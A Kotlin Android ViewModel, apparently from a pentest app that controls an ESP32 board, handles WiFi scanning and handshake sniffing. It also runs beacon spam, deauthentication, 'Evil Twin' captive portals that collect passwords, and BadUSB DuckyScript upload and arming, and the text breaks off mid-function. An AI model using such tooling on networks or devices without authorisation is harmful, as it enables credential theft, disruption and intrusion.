package com.swp81x.nrsuite

import android.app.Application
import android.content.Context
import android.content.Intent
import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbManager
import android.net.Uri
import android.provider.DocumentsContract
import android.provider.OpenableColumns
import androidx.core.content.ContextCompat
import androidx.documentfile.provider.DocumentFile
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.swp81x.nrsuite.core.eapol.EapolHandshake
import com.swp81x.nrsuite.core.flasher.Esp32Flasher
import com.swp81x.nrsuite.core.flasher.UsbSerialFlasherTransport
import com.swp81x.nrsuite.core.eapol.EapolParser
import com.swp81x.nrsuite.core.history.HistoryLevel
import com.swp81x.nrsuite.core.history.HistoryEntry
import com.swp81x.nrsuite.core.log.LogEntry
import com.swp81x.nrsuite.core.log.LogLevel
import com.swp81x.nrsuite.core.pcap.PcapWriter
import com.swp81x.nrsuite.core.session.ConnectionState
import com.swp81x.nrsuite.core.session.NrSession
import com.swp81x.nrsuite.core.wpa.WpaHandshakeVerifier
import com.swp81x.nrsuite.core.wpa.WpaHandshakeParser
import com.swp81x.nrsuite.core.wpa.WpaHandshake
import com.swp81x.nrsuite.core.wpa.EvilTwinResult
import com.swp81x.nrsuite.core.sniff.SniffRequest
import com.swp81x.nrsuite.core.storage.StorageFile
import com.swp81x.nrsuite.core.usb.UsbSerialDevice
import com.swp81x.nrsuite.core.usb.UsbSerialDeviceCatalog
import com.swp81x.nrsuite.core.usb.UsbSerialTransport
import com.swp81x.nrsuite.service.NrSuiteForegroundService
import java.io.File
import java.io.IOException
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.Job
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val usbManager =
        application.getSystemService(Context.USB_SERVICE) as UsbManager
    private val preferences =
        application.getSharedPreferences(PREFERENCES_NAME, Context.MODE_PRIVATE)

    private val _exportDirectory = MutableStateFlow<Uri?>(null)
    val exportDirectory: StateFlow<Uri?> = _exportDirectory.asStateFlow()

    private val _exportDirectoryName = MutableStateFlow("Not configured")
    val exportDirectoryName: StateFlow<String> = _exportDirectoryName.asStateFlow()

    private val _requiresRootDirectory = MutableStateFlow(false)
    val requiresRootDirectory: StateFlow<Boolean> = _requiresRootDirectory.asStateFlow()

    private val _devices = MutableStateFlow<List<UsbSerialDevice>>(emptyList())
    val devices: StateFlow<List<UsbSerialDevice>> = _devices.asStateFlow()

    private val _connectionState =
        MutableStateFlow<ConnectionState>(ConnectionState.Disconnected)
    val connectionState: StateFlow<ConnectionState> = _connectionState.asStateFlow()

    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs: StateFlow<List<LogEntry>> = _logs.asStateFlow()

    private val _history = MutableStateFlow<List<HistoryEntry>>(emptyList())
    val history: StateFlow<List<HistoryEntry>> = _history.asStateFlow()

    private val _activeDeviceName = MutableStateFlow<String?>(null)
    val activeDeviceName: StateFlow<String?> = _activeDeviceName.asStateFlow()

    private val _firmwareFlashUri = MutableStateFlow<Uri?>(null)
    val firmwareFlashUri: StateFlow<Uri?> = _firmwareFlashUri.asStateFlow()

    private val _firmwareFlashName = MutableStateFlow<String?>(null)
    val firmwareFlashName: StateFlow<String?> = _firmwareFlashName.asStateFlow()

    private val _firmwareFlashSize = MutableStateFlow(0L)
    val firmwareFlashSize: StateFlow<Long> = _firmwareFlashSize.asStateFlow()

    private val _firmwareFlashing = MutableStateFlow(false)
    val firmwareFlashing: StateFlow<Boolean> = _firmwareFlashing.asStateFlow()

    private val _firmwareFlashProgress = MutableStateFlow(0)
    val firmwareFlashProgress: StateFlow<Int> = _firmwareFlashProgress.asStateFlow()

    private val _firmwareFlashStatus = MutableStateFlow<String?>(null)
    val firmwareFlashStatus: StateFlow<String?> = _firmwareFlashStatus.asStateFlow()

    private val _firmwareTargetDevice = MutableStateFlow<UsbSerialDevice?>(null)
    val firmwareTargetDevice: StateFlow<UsbSerialDevice?> = _firmwareTargetDevice.asStateFlow()

    private val _recentModuleIds = MutableStateFlow(
        preferences.getString(PREF_RECENT_MODULES, "")
            ?.split(",")
            ?.map { it.trim() }
            ?.filter { it.isNotBlank() }
            ?: emptyList()
    )
    val recentModuleIds: StateFlow<List<String>> = _recentModuleIds.asStateFlow()

    private val _events = MutableStateFlow<List<JSONObject>>(emptyList())
    val events: StateFlow<List<JSONObject>> = _events.asStateFlow()

    private val _networks = MutableStateFlow<List<JSONObject>>(emptyList())
    val networks: StateFlow<List<JSONObject>> = _networks.asStateFlow()

    private val _scanning = MutableStateFlow(false)
    val scanning: StateFlow<Boolean> = _scanning.asStateFlow()

    private val _sniffing = MutableStateFlow(false)
    val sniffing: StateFlow<Boolean> = _sniffing.asStateFlow()

    private val _sniffPacketCount = MutableStateFlow(0L)
    val sniffPacketCount: StateFlow<Long> = _sniffPacketCount.asStateFlow()

    private val _sniffHandshake = MutableStateFlow(EapolHandshake())
    val sniffHandshake: StateFlow<EapolHandshake> = _sniffHandshake.asStateFlow()

    private val _capturePath = MutableStateFlow<String?>(null)
    val capturePath: StateFlow<String?> = _capturePath.asStateFlow()

    private val _beaconRunning = MutableStateFlow(false)
    val beaconRunning: StateFlow<Boolean> = _beaconRunning.asStateFlow()

    private val _beaconSent = MutableStateFlow(0)
    val beaconSent: StateFlow<Int> = _beaconSent.asStateFlow()

    private val _beaconSsidCount = MutableStateFlow(0)
    val beaconSsidCount: StateFlow<Int> = _beaconSsidCount.asStateFlow()

    private val _beaconChannel = MutableStateFlow(0)
    val beaconChannel: StateFlow<Int> = _beaconChannel.asStateFlow()

    private val _beaconListMap = MutableStateFlow<Map<String, List<String>>>(emptyMap())
    val beaconListMap: StateFlow<Map<String, List<String>>> = _beaconListMap.asStateFlow()

    private var beaconStatusJob: Job? = null

    private val _deauthRunning = MutableStateFlow(false)
    val deauthRunning: StateFlow<Boolean> = _deauthRunning.asStateFlow()

    private val _deauthSent = MutableStateFlow(0)
    val deauthSent: StateFlow<Int> = _deauthSent.asStateFlow()

    private val _deauthTarget = MutableStateFlow("")
    val deauthTarget: StateFlow<String> = _deauthTarget.asStateFlow()

    private val _deauthChannel = MutableStateFlow(0)
    val deauthChannel: StateFlow<Int> = _deauthChannel.asStateFlow()

    private val _portalRunning = MutableStateFlow(false)
    val portalRunning: StateFlow<Boolean> = _portalRunning.asStateFlow()

    private val _portalHtmlSize = MutableStateFlow(0)
    val portalHtmlSize: StateFlow<Int> = _portalHtmlSize.asStateFlow()

    private val _portalHtmlComplete = MutableStateFlow(false)
    val portalHtmlComplete: StateFlow<Boolean> = _portalHtmlComplete.asStateFlow()

    private val _portalSsid = MutableStateFlow("")
    val portalSsid: StateFlow<String> = _portalSsid.asStateFlow()

    private val _portalChannel = MutableStateFlow(0)
    val portalChannel: StateFlow<Int> = _portalChannel.asStateFlow()

    private val _portalViews = MutableStateFlow(0)
    val portalViews: StateFlow<Int> = _portalViews.asStateFlow()

    private val _portalClients = MutableStateFlow(0)
    val portalClients: StateFlow<Int> = _portalClients.asStateFlow()

    private val _portalCapturedData = MutableStateFlow(0)
    val portalCapturedData: StateFlow<Int> = _portalCapturedData.asStateFlow()

    private val _portalHtmlUri = MutableStateFlow<Uri?>(null)
    val portalHtmlUri: StateFlow<Uri?> = _portalHtmlUri.asStateFlow()

    private val _portalHtmlName = MutableStateFlow<String?>(null)
    val portalHtmlName: StateFlow<String?> = _portalHtmlName.asStateFlow()

    private val _portalMode = MutableStateFlow<String?>(null)
    val portalMode: StateFlow<String?> = _portalMode.asStateFlow()

    private val _portalEventLog = MutableStateFlow<List<String>>(emptyList())
    val portalEventLog: StateFlow<List<String>> = _portalEventLog.asStateFlow()

    private val _evilTwinEventLog = MutableStateFlow<List<String>>(emptyList())
    val evilTwinEventLog: StateFlow<List<String>> = _evilTwinEventLog.asStateFlow()

    private val _evilTwinHtmlUri = MutableStateFlow<Uri?>(null)
    private val _evilTwinHtmlName = MutableStateFlow<String?>(null)
    val evilTwinHtmlName: StateFlow<String?> = _evilTwinHtmlName.asStateFlow()

    private val _portalHandshake = MutableStateFlow(EapolHandshake())
    val portalHandshake: StateFlow<EapolHandshake> = _portalHandshake.asStateFlow()

    private val _evilTwinPasswords = MutableStateFlow<List<String>>(emptyList())
    val evilTwinPasswords: StateFlow<List<String>> = _evilTwinPasswords.asStateFlow()

    private val _portalWpaHandshake = MutableStateFlow(WpaHandshake())
    val portalWpaHandshake: StateFlow<WpaHandshake> = _portalWpaHandshake.asStateFlow()

    private val _evilTwinResults = MutableStateFlow<List<EvilTwinResult>>(emptyList())
    val evilTwinResults: StateFlow<List<EvilTwinResult>> = _evilTwinResults.asStateFlow()

    private var portalPcapJob: Job? = null

    private var portalStatusJob: Job? = null

    private val _storageFiles = MutableStateFlow<List<StorageFile>>(emptyList())
    val storageFiles: StateFlow<List<StorageFile>> = _storageFiles.asStateFlow()

    private val _storageTotal = MutableStateFlow(0L)
    val storageTotal: StateFlow<Long> = _storageTotal.asStateFlow()

    private val _storageUsed = MutableStateFlow(0L)
    val storageUsed: StateFlow<Long> = _storageUsed.asStateFlow()

    private val _storageFree = MutableStateFlow(0L)
    val storageFree: StateFlow<Long> = _storageFree.asStateFlow()

    private val _storageLoading = MutableStateFlow(false)
    val storageLoading: StateFlow<Boolean> = _storageLoading.asStateFlow()

    private val _badUsbPayloadUri = MutableStateFlow<Uri?>(null)
    val badUsbPayloadUri: StateFlow<Uri?> = _badUsbPayloadUri.asStateFlow()

    private val _badUsbPayloadName = MutableStateFlow<String?>(null)
    val badUsbPayloadName: StateFlow<String?> = _badUsbPayloadName.asStateFlow()

    private val _badUsbSavedScriptText = MutableStateFlow<String?>(null)

    private val _bleSavedScriptText = MutableStateFlow<String?>(null)

    private val _duckyScriptMap = MutableStateFlow<Map<String, String>>(emptyMap())
    val duckyScriptMap: StateFlow<Map<String, String>> = _duckyScriptMap.asStateFlow()

    private val _badUsbUploading = MutableStateFlow(false)
    val badUsbUploading: StateFlow<Boolean> = _badUsbUploading.asStateFlow()

    private val _badUsbProgress = MutableStateFlow(0)
    val badUsbProgress: StateFlow<Int> = _badUsbProgress.asStateFlow()

    private val _bleAdvertising = MutableStateFlow(false)
    val bleAdvertising: StateFlow<Boolean> = _bleAdvertising.asStateFlow()

    private val _bleConnected = MutableStateFlow(false)
    val bleConnected: StateFlow<Boolean> = _bleConnected.asStateFlow()

    private val _blePeer = MutableStateFlow("")
    val blePeer: StateFlow<String> = _blePeer.asStateFlow()

    private val _blePayloadUri = MutableStateFlow<Uri?>(null)
    val blePayloadUri: StateFlow<Uri?> = _blePayloadUri.asStateFlow()

    private val _blePayloadName = MutableStateFlow<String?>(null)
    val blePayloadName: StateFlow<String?> = _blePayloadName.asStateFlow()

    private var bleStatusJob: Job? = null

    private var session: NrSession? = null
    private var activeSerialDevice: UsbSerialDevice? = null
    private var activeDeviceFingerprint: String? = null
    private var sessionObservers: List<Job> = emptyList()
    private var pcapWriter: PcapWriter? = null
    private var pcapJob: Job? = null

    init {
        loadExportDirectory()
        loadBeaconLists()
        loadDuckyScripts()
        loadHistory()
        refreshDevices()
    }

    fun onModuleOpened(moduleId: String) {
        val current = _recentModuleIds.value.toMutableList()
        current.remove(moduleId)
        current.add(0, moduleId)
        val trimmed = current.take(3)
        _recentModuleIds.value = trimmed
        preferences.edit().putString(PREF_RECENT_MODULES, trimmed.joinToString(",")).apply()
    }

    fun saveBeaconList(name: String, ssids: List<String>) {
        val cleanName = name.trim()
        if (cleanName.isBlank()) return
        val cleanSsids = ssids.map { it.trim() }.filter { it.isNotEmpty() }.distinct()
        _beaconListMap.update { it + (cleanName to cleanSsids) }
        persistBeaconLists()
        appendLog("Saved beacon SSID list '$cleanName' (${cleanSsids.size} SSIDs).")
    }

    fun deleteBeaconList(name: String) {
        _beaconListMap.update { it - name }
        persistBeaconLists()
        appendLog("Deleted beacon SSID list '$name'.")
    }

    private fun loadBeaconLists() {
        val raw = preferences.getString(PREF_BEACON_LISTS, null) ?: return
        runCatching {
            val json = JSONObject(raw)
            val map = mutableMapOf<String, List<String>>()
            json.keys().forEach { key ->
                val array = json.optJSONArray(key) ?: return@forEach
                val list = mutableListOf<String>()
                for (i in 0 until array.length()) {
                    val value = array.optString(i)
                    if (value.isNotBlank()) list += value
                }
                map[key] = list
            }
            _beaconListMap.value = map
        }
    }

    private fun persistBeaconLists() {
        val json = JSONObject()
        _beaconListMap.value.forEach { (name, ssids) ->
            val array = org.json.JSONArray()
            ssids.forEach { array.put(it) }
            json.put(name, array)
        }
        preferences.edit().putString(PREF_BEACON_LISTS, json.toString()).apply()
    }

    fun onRootDirectoryPromptShown() {
        _requiresRootDirectory.value = false
    }

    fun setExportDirectory(uri: Uri) {
        val resolver = getApplication<Application>().contentResolver
        val flags = Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_WRITE_URI_PERMISSION
        runCatching { resolver.takePersistableUriPermission(uri, flags) }
        _exportDirectory.value = uri
        preferences.edit().putString(PREF_EXPORT_DIRECTORY, uri.toString()).apply()
        _exportDirectoryName.value = displayNameForTreeUri(uri)
        appendLog("Capture export folder: ${_exportDirectoryName.value}")
        ensureRootStructure(uri)
    }

    private fun loadExportDirectory() {
        val stored = preferences.getString(PREF_EXPORT_DIRECTORY, null) ?: return
        val uri = runCatching { Uri.parse(stored) }.getOrNull() ?: return
        _exportDirectory.value = uri
        _exportDirectoryName.value = displayNameForTreeUri(uri)
        ensureRootStructure(uri)
    }

    fun refreshDevices() {
        val found = UsbSerialDeviceCatalog.list(usbManager)
        _devices.value = found
        appendLog("Found ${found.size} supported USB serial device(s).")
    }

    fun clearLogs() {
        _logs.value = emptyList()
    }

    fun clearHistory() {
        _history.value = emptyList()
        persistHistory()
    }

    fun addHistory(module: String, summary: String, level: HistoryLevel = HistoryLevel.INFO) {
        val entry = HistoryEntry(
            id = System.currentTimeMillis(),
            timestamp = java.time.LocalTime.now()
                .format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss")),
            module = module,
            summary = summary,
            level = level,
        )
        _history.update { (listOf(entry) + it).take(300) }
        persistHistory()
    }

    private fun loadHistory() {
        val raw = preferences.getString(PREF_HISTORY, null) ?: return
        runCatching {
            val array = org.json.JSONArray(raw)
            val entries = mutableListOf<HistoryEntry>()
            for (i in 0 until array.length()) {
                val obj = array.optJSONObject(i) ?: continue
                entries += HistoryEntry(
                    id = obj.optLong("id"),
                    timestamp = obj.optString("timestamp"),
                    module = obj.optString("module"),
                    summary = obj.optString("summary"),
                    level = runCatching {
                        HistoryLevel.valueOf(obj.optString("level"))
                    }.getOrDefault(HistoryLevel.INFO),
                )
            }
            _history.value = entries
        }
    }

    private fun persistHistory() {
        val array = org.json.JSONArray()
        _history.value.forEach { entry ->
            array.put(org.json.JSONObject().apply {
                put("id", entry.id)
                put("timestamp", entry.timestamp)
                put("module", entry.module)
                put("summary", entry.summary)
                put("level", entry.level.name)
            })
        }
        preferences.edit().putString(PREF_HISTORY, array.toString()).apply()
    }

    fun onUsbDeviceAttached() {
        refreshDevices()
        appendLog("USB device attached.", level = LogLevel.USB)
        autoConnectLastDevice()
    }

    private fun autoConnectLastDevice() {
        val savedFingerprint = preferences.getString(PREF_LAST_DEVICE_FINGERPRINT, null) ?: return
        val entry = _devices.value.firstOrNull {
            deviceFingerprint(it.device) == savedFingerprint
        } ?: return
        if (usbManager.hasPermission(entry.device)) {
            appendLog("Auto-reconnecting to ${entry.displayName}...")
            connect(entry.device)
        } else {
            appendLog("Last device attached; tap Connect to grant USB permission.")
        }
    }

    private fun deviceFingerprint(device: UsbDevice): String {
        val serial = runCatching { device.serialNumber }.getOrNull().orEmpty()
        return listOf(
            serial,
            device.vendorId.toString(),
            device.productId.toString(),
            device.manufacturerName.orEmpty(),
            device.productName.orEmpty(),
        ).joinToString("|")
    }

    fun onUsbDeviceDetached(device: UsbDevice) {
        refreshDevices()
        appendLog("USB device detached: ${device.deviceName}", level = LogLevel.USB)

        val detachedFingerprint = runCatching { deviceFingerprint(device) }.getOrNull()
        if (activeDeviceFingerprint == null || detachedFingerprint == null ||
            activeDeviceFingerprint != detachedFingerprint
        ) {
            appendLog("Detached device is not the active session; keeping connection.", level = LogLevel.USB)
            return
        }

        activeDeviceFingerprint = null
        activeSerialDevice = null
        if (_firmwareTargetDevice.value?.device?.deviceId == device.deviceId) {
            _firmwareTargetDevice.value = null
        }
        _activeDeviceName.value = null

        // Set clean state BEFORE disconnecting so UI never shows Failed
        _connectionState.value = ConnectionState.Disconnected

        val currentSession = session
        sessionObservers.forEach { it.cancel() }
        sessionObservers = emptyList()
        session = null
        if (currentSession != null) {
            viewModelScope.launch {
                runCatching { currentSession.disconnect() }
            }
        }
    }

    fun hasPermission(device: UsbDevice): Boolean = usbManager.hasPermission(device)

    fun onPermissionResult(device: UsbDevice, granted: Boolean) {
        val reallyGranted = granted || usbManager.hasPermission(device)
        appendLog(
            if (reallyGranted) "USB permission granted for ${device.deviceName}."
            else "USB permission denied for ${device.deviceName}.",
            level = LogLevel.USB,
        )
        if (reallyGranted) {
            refreshDevices()
            connect(device)
        }
    }

    fun connect(device: UsbDevice) {
        if (!usbManager.hasPermission(device)) {
            appendLog("USB permission is required before connecting.")
            return
        }

        val entry = _devices.value.firstOrNull { it.device.deviceId == device.deviceId }
            ?: UsbSerialDeviceCatalog.find(usbManager, device)
        if (entry == null) {
            appendLog("No supported USB serial driver for ${device.deviceName}.")
            return
        }

        disconnectInternal()

        val newSession = NrSession(
            transport = UsbSerialTransport(usbManager, entry.driver),
            scope = viewModelScope,
        )
        session = newSession
        activeSerialDevice = entry
        _firmwareTargetDevice.value = entry
        activeDeviceFingerprint = deviceFingerprint(entry.device)
        _activeDeviceName.value = entry.displayName
        preferences.edit()
            .putString(PREF_LAST_DEVICE_FINGERPRINT, activeDeviceFingerprint)
            .apply()
        observe(newSession)
        viewModelScope.launch {
            appendLog("Opening ${entry.displayName}...")
            newSession.connect()
        }
    }

    fun scanWifi() {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before scanning.")
            return
        }
        if (_scanning.value) return

        _networks.value = emptyList()
        _scanning.value = true
        viewModelScope.launch {
            appendLog("Starting WiFi scan...")
            val count = activeSession.scanWifi()
            _scanning.value = false
            when {
                count == null -> appendLog("WiFi scan timed out.")
                count < 0 -> appendLog("WiFi scan failed.")
                else -> {
                    appendLog("WiFi scan complete: $count network(s).")
                    addHistory("scan", "WiFi scan complete: $count network(s)", HistoryLevel.SUCCESS)
                }
            }
        }
    }

    fun setBadUsbPayload(uri: Uri, name: String?) {
        _badUsbPayloadUri.value = uri
        _badUsbPayloadName.value = name ?: uri.lastPathSegment ?: "payload.txt"
        _badUsbProgress.value = 0
        appendLog("BadUSB payload selected: ${_badUsbPayloadName.value}")
    }

    fun clearBadUsbPayload() {
        _badUsbPayloadUri.value = null
        _badUsbPayloadName.value = null
        _badUsbSavedScriptText.value = null
        _badUsbProgress.value = 0
        appendLog("BadUSB payload cleared.")
    }

    fun saveDuckyScript(name: String, script: String) {
        val cleanName = name.trim()
        if (cleanName.isBlank()) return
        _duckyScriptMap.update { it + (cleanName to script) }
        persistDuckyScripts()
        appendLog("Saved DuckyScript '$cleanName'.")
    }

    fun deleteDuckyScript(name: String) {
        _duckyScriptMap.update { it - name }
        persistDuckyScripts()
        appendLog("Deleted DuckyScript '$name'.")
    }

    fun useBadUsbSavedScript(name: String) {
        val script = _duckyScriptMap.value[name] ?: return
        _badUsbPayloadUri.value = null
        _badUsbPayloadName.value = name
        _badUsbSavedScriptText.value = script
        appendLog("BadUSB script selected: $name")
    }

    fun useBleSavedScript(name: String) {
        val script = _duckyScriptMap.value[name] ?: return
        _blePayloadUri.value = null
        _blePayloadName.value = name
        _bleSavedScriptText.value = script
        appendLog("BLE script selected: $name")
    }

    private fun loadDuckyScripts() {
        val raw = preferences.getString(PREF_DUCKY_SCRIPTS, null) ?: return
        runCatching {
            val json = JSONObject(raw)
            val map = mutableMapOf<String, String>()
            json.keys().forEach { key -> map[key] = json.optString(key, "") }
            _duckyScriptMap.value = map
        }
    }

    private fun persistDuckyScripts() {
        val json = JSONObject()
        _duckyScriptMap.value.forEach { (name, script) -> json.put(name, script) }
        preferences.edit().putString(PREF_DUCKY_SCRIPTS, json.toString()).apply()
    }

    fun armBadUsb(mscMode: Boolean) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before arming a BadUSB payload.")
            return
        }
        if (_badUsbUploading.value) return

        val chip = (_connectionState.value as? ConnectionState.Connected)?.chip
        if (chip !in setOf("ESP32-S2", "ESP32-S3")) {
            appendLog("BadUSB requires ESP32-S2 or ESP32-S3 (connected chip: ${chip ?: "unknown"}).")
            return
        }

        val payloadUri = _badUsbPayloadUri.value
        val savedScript = _badUsbSavedScriptText.value
        if (payloadUri == null && savedScript == null) {
            appendLog("Choose a DuckyScript payload first.")
            return
        }

        viewModelScope.launch {
            _badUsbUploading.value = true
            _badUsbProgress.value = 0
            try {
                val bytes = savedScript?.toByteArray(Charsets.UTF_8)
                    ?: withContext(Dispatchers.IO) {
                        runCatching {
                            payloadUri?.let {
                                getApplication<Application>().contentResolver
                                    .openInputStream(it)
                                    ?.use { stream -> stream.readBytes() }
                            }
                        }.getOrNull()
                    }
                if (bytes == null) {
                    appendLog("Could not read the selected BadUSB payload.")
                    return@launch
                }
                if (bytes.isEmpty()) {
                    appendLog("BadUSB payload is empty.")
                    return@launch
                }

                val remoteFilename = "ducky.txt"
                var offset = 0
                while (offset < bytes.size) {
                    val end = minOf(offset + BADUSB_RAW_CHUNK_SIZE, bytes.size)
                    val chunk = bytes.copyOfRange(offset, end)
                    val encoded = android.util.Base64.encodeToString(chunk, android.util.Base64.NO_WRAP)
                    val isLast = end == bytes.size

                    var success = false
                    for (attempt in 1..3) {
                        val response = activeSession.sendCommand(
                            "SET_FILE_CHUNK",
                            JSONObject().apply {
                                put("filename", remoteFilename)
                                put("data", encoded)
                                put("last", isLast)
                            },
                            timeoutMs = 6_000,
                        )
                        if (response?.optBoolean("ok") == true) {
                            success = true
                            break
                        }
                        appendLog("BadUSB chunk attempt $attempt failed; retrying...")
                        delay(300)
                    }
                    if (!success) {
                        appendLog("BadUSB upload failed at byte $offset.")
                        return@launch
                    }

                    offset = end
                    _badUsbProgress.value = ((offset * 100) / bytes.size)
                }

                val response = activeSession.sendCommand(
                    "START_BADUSB",
                    JSONObject().apply {
                        put("filename", remoteFilename)
                        put("msc", mscMode)
                    },
                    timeoutMs = 10_000,
                )
                if (response?.optBoolean("ok") == true) {
                    appendLog("BadUSB payload armed. Unplug and re-plug the device to execute it once.")
                    addHistory("badusb", "Payload armed for next boot", HistoryLevel.SUCCESS)
                } else {
                    appendLog("Failed to arm BadUSB payload: ${response?.optString("msg") ?: "timeout"}")
                }
            } finally {
                _badUsbUploading.value = false
            }
        }
    }

    fun refreshStorage() {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before browsing storage.")
            return
        }
        if (_storageLoading.value) return

        _storageLoading.value = true
        viewModelScope.launch {
            val response = activeSession.sendCommand("MSC_LIST", timeoutMs = 8_000)
            _storageLoading.value = false
            if (response?.optBoolean("ok") != true) {
                appendLog("Failed to list storage: ${response?.optString("msg") ?: "timeout"}")
                return@launch
            }

            _storageTotal.value = response.optLong("total", 0L)
            _storageUsed.value = response.optLong("used", 0L)
            _storageFree.value = response.optLong("free", 0L)

            val files = mutableListOf<StorageFile>()
            val jsonFiles = response.optJSONArray("files")
            if (jsonFiles != null) {
                for (index in 0 until jsonFiles.length()) {
                    val item = jsonFiles.optJSONObject(index) ?: continue
                    files += StorageFile(
                        name = item.optString("name"),
                        size = item.optInt("size", 0),
                    )
                }
            }
            _storageFiles.value = files
            appendLog("Storage: ${files.size} file(s), ${_storageFree.value} bytes free.")
        }
    }

    fun deleteStorageFile(name: String) {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before deleting files.")
            return
        }
        viewModelScope.launch {
            val response = activeSession.sendCommand(
                "MSC_DELETE",
                JSONObject().put("path", name),
                timeoutMs = 8_000,
            )
            if (response?.optBoolean("ok") == true) {
                appendLog("Deleted $name.")
                refreshStorage()
            } else {
                appendLog("Failed to delete $name: ${response?.optString("msg") ?: "timeout"}")
            }
        }
    }

    fun startMassStorage() {
        val activeSession = session
        if (activeSession == null) {
            appendLog("Connect to a device before entering mass storage mode.")
            return
        }
        val chip = (_connectionState.value as? ConnectionState.Connected)?.chip
        if (chip !in setOf("ESP32-S2", "ESP32-S3")) {
            appendLog("Mass storage start requires ESP32-S2 or ESP32-S3 (connected chip: ${chip ?: "unknown"}).")
            return
        }

        viewModelScope.launch {
            appendLog("Switching device to USB mass storage mode...")
            val response = activeSession.sendCommand("START_MSC", timeoutMs = 5_000)
            if (response?.optBoolean("ok") == true) {
                appendLog("Device is rebooting into mass storage mode; the USB bridge will disappear.")
            } else if (response == null) {
                appendLog("No response, expected: USB is re-enumerating as mass storage.")
            } else {
                appendLog("Device refused mass storage mode: ${response.optString("msg")}")
            }
        }
    }

    fun setEvilTwinHtmlFile(uri: Uri, name: String?) {
        _evilTwinHtmlUri.value = uri
        _evilTwinHtmlName.value = name ?: uri.lastPathSegment ?: "evil_twin.html"
        appendLog("Evil Twin HTML selected: ${_evilTwinHtmlName.value}")
    }

    fun clearEvilTwinHtmlFile() {
        _evilTwinHtmlUri.value = null
        _evilTwinHtmlName.value = null
        appendLog("Evil Twin HTML cleared.")
    }

    fun setFirmwareFlashFile(uri: Uri, name: String?) {
        _firmwareFlashUri.value = uri
        _firmwareFlashName.value = name ?: uri.lastPathSegment ?: "firmware.bin"
        _firmwareFlashSize.value = queryDocumentSize(uri)
        appendLog("Firmware image selected: ${_firmwareFlashName.value}")
    }

    private fun queryDocumentSize(uri: Uri): Long {
        return runCatching {
            getApplication<Application>().contentResolver.query(
                uri,
                arrayOf(OpenableColumns.SIZE),
                null,
                null,
                null,
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val index = cursor.getColumnIndex(OpenableColumns.SIZE)
                    if (index >= 0 && !cursor.isNull(index)) cursor.getLong(index) else 0L
                } else {
                    0L
                }
            } ?: 0L
        }.getOrDefault(0L)
    }

    fun clearFirmwareFlashFile() {
        _firmwareFlashUri.value = null
        _firmwareFlashName.value = null
        _firmwareFlashSize.value = 0
        _firmwareFlashProgress.value = 0
        _firmwareFlashStatus.value = null
    }

    fun selectFirmwareTarget(device: UsbDevice) {
        val entry = _devices.value.firstOrNull { it.device.deviceId == device.deviceId }
            ?: UsbSerialDeviceCatalog.find(usbManager, device)
        if (entry == null) {
            appendLog("No supported USB serial driver for ${device.deviceName}.")
            return
        }
        _firmwareTargetDevice.value = entry
        appendLog("Firmware flash target: ${entry.displayName}")
    }

    fun startFirmwareFlash(targetChip: String, skipReset: Boolean) {
        val uri = _firmwareFlashUri.value
        if (uri == null) {
            appendLog("Choose a merged firmware .bin before flashing.")
            return
        }
        if (_firmwareFlashing.value) return

        val entry = _firmwareTargetDevice.value
        if (entry == null) {
            appendLog("Select a flash target device before flashing.")
            return
        }
        if (!usbManager.hasPermission(entry.device)) {
            appendLog("USB permission is required for the selected flash target.")
            return
        }

        _firmwareFlashing.value = true
        _firmwareFlashProgress.value = 0
        _firmwareFlashStatus.value = "Reading firmware image..."

        viewModelScope.launch {
            try {
                val bytes = withContext(Dispatchers.IO) {
                    getApplication<Application>().contentResolver
                        .openInputStream(uri)
                        ?.use { it.readBytes() }
                }
                if (bytes == null || bytes.isEmpty()) {
                    throw IOException("Could not read the selected firmware image.")
                }

                _firmwareFlashStatus.value = "Stopping active modules..."
                stopModulesForFlash()

                val currentSession = session
                sessionObservers.forEach { it.cancel() }
                sessionObservers = emptyList()
                session = null
                activeDeviceFingerprint = null
                _connectionState.value = ConnectionState.Disconnected
                _activeDeviceName.value = null
                currentSession?.disconnect()

                val resetMode = when {
                    skipReset -> Esp32Flasher.ResetMode.NONE
                    entry.device.vendorId == 0x303A && entry.device.productId == 0x1001 ->
                        Esp32Flasher.ResetMode.USB_JTAG
                    else -> Esp32Flasher.ResetMode.CLASSIC
                }

                val flasher = Esp32Flasher(
                    transport = UsbSerialFlasherTransport(usbManager, entry.driver),
                    supportsEncryptedFlash = targetChip in setOf("ESP32-S2", "ESP32-S3", "ESP32-C3"),
                )

                _firmwareFlashStatus.value = if (skipReset) {
                    "Connecting to ROM bootloader..."
                } else {
                    "Resetting into ROM bootloader..."
                }

                withContext(Dispatchers.IO) {
                    flasher.flash(
                        firmware = bytes,
                        offset = 0,
                        resetMode = resetMode,
                    ) { percent ->
                        val written = (bytes.size.toLong() * percent / 100L).toInt()
                        _firmwareFlashProgress.value = percent
                        _firmwareFlashStatus.value = if (percent >= 100) {
                            "Firmware written — rebooting device..."
                        } else {
                            "Writing... $percent%  (${written / 1024} / ${bytes.size / 1024} KB)"
                        }
                    }
                }

                _firmwareFlashProgress.value = 100
                _firmwareFlashStatus.value = "Flash complete. The device is rebooting; reconnect after it disappears."
                appendLog("Firmware flash complete (${bytes.size} bytes at 0x0).", level = LogLevel.SUCCESS)
                addHistory("firmware", "Flashed ${bytes.size} bytes at 0x0", HistoryLevel.SUCCESS)
                delay(2_000)
                refreshDevices()
            } catch (t: Throwable) {
                _firmwareFlashProgress.value = 0
                _firmwareFlashStatus.value = "Flash failed: ${t.message ?: t.javaClass.simpleName}"
                appendLog(
